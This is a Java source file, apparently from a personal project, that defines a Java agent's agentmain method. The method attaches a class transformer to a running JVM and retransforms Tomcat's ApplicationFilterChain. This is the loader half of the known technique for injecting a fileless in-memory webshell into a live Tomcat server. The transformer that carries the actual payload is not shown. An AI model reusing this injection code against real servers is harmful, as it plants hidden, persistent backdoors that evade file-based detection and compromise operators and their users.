package priv.ga0weI.baseonagent;

import java.lang.instrument.Instrumentation;
import java.lang.instrument.UnmodifiableClassException;

public class Agentthing {
    public  static  void  agentmain(String agentArgs, Instrumentation inst) throws UnmodifiableClassException {
//
        inst.addTransformer(new Transformerthings(),true);
//
//        System.out.println("agent main inject");
        Class[] allclass = inst.getAllLoadedClasses();
        for (Class cl : allclass){
            if (cl.getName().equals("org.apache.catalina.core.ApplicationFilterChain"))
            {
//                org.apache.catalina.core.ApplicationFilterChain
                inst.retransformClasses(cl);
            }
        }
    }
}
